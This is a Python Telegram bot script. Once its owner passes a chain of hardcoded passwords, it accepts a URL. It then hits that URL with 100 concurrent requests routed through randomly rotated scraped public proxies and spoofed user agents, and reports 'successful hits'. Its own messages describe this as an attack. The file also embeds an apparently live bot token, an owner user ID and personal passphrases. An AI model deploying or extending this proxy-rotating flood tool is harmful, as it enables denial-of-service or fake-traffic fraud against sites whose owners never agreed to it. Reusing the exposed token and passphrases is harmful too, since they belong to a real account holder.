import os, time, requests, threading, random
from http.server import HTTPServer, BaseHTTPRequestHandler

TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484

class HealthCheck(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"PROXY_ENGINE_READY")
    def do_HEAD(self):
        self.send_response(200); self.end_headers()

def run_health_check():
    HTTPServer(('0.0.0.0', 10000), HealthCheck).serve_forever()

class SovereignMaster:
    def __init__(self, t):
        self.t, self.f, self.r, self.u = t, {}, False, f"https://api.telegram.org/bot{t}"
        self.proxies = []
        self.success_count = 0
        self._fetch_proxies()
        self._s(MASTER_ID, f"🔱 SYSTEM ONLINE\n📡 PROXIES LOADED: {len(self.proxies)}")

    def _fetch_proxies(self):
        try:
            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                self.proxies = [p for p in resp.text.split('\r\n') if p]
        except: self.proxies = []

    def _s(self, c, x):
        try: requests.post(f"{self.u}/sendMessage", json={'chat_id': c, 'text': x})
        except: pass

    def _fire(self, url):
        try:
            agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
            h = {'User-Agent': random.choice(agents)}
            px_addr = random.choice(self.proxies) if self.proxies else None
            px = {"http": f"http://{px_addr}", "https": f"http://{px_addr}"} if px_addr else None
            
            resp = requests.get(url, headers=h, proxies=px, timeout=10)
            if resp.status_code == 200:
                self.success_count += 1
        except: pass

    def _boost(self, url):
        self.success_count = 0
        self._s(MASTER_ID, "🚀 ATTACKING WITH PROXY ROTATION...")
        threads = []
        for _ in range(100):
            t = threading.Thread(target=self._fire, args=(url,))
            t.start()
            threads.append(t)
        
        for t in threads: t.join()
        self._s(MASTER_ID, f"🔱 REPORT:\n✅ TOTAL SUCCESSFUL HITS: {self.success_count}\n🌐 VIA UNIQUE PROXIES")

    def listen(self):
        o = 0
        while True:
            try:
                res = requests.get(f"{self.u}/getUpdates?offset={o}&timeout=10").json()
                for u in res.get('result', []):
                    o = u['update_id'] + 1
                    m = u.get('message', {}); uid = m.get('from', {}).get('id'); tx = m.get('text', '')
                    if uid != MASTER_ID: continue
                    st = self.f.get(uid, 0)
                    if tx == "/start":
                        self._s(uid, "WELCOME MASTER. ENTER FIRST PASSWORD.")
                        self.f[uid] = 1
                    elif st == 1 and "ariful islam pappu 2000" in tx.lower():
                        self._s(uid, "IDENTITY CONFIRMED. ENTER SECOND LOGIC.")
                        self.f[uid] = 2
                    elif st == 2 and "জামালপুর" in tx:
                        self._s(uid, "LEVEL 2 CLEARED. ENTER MASTER KEY.")
                        self.f[uid] = 3
                    elif st == 3 and tx == "Aip2k3052":
                        self.f[uid] = "ROOT"; self.r = True
                        self._s(uid, "ACCESS GRANTED. SEND LINK.")
                    elif self.r and "http" in tx:
                        self._boost(tx)
            except: pass
            time.sleep(1)

if __name__ == "__main__":
    threading.Thread(target=run_health_check, daemon=True).start()
    SovereignMaster(TOKEN).listen()
    
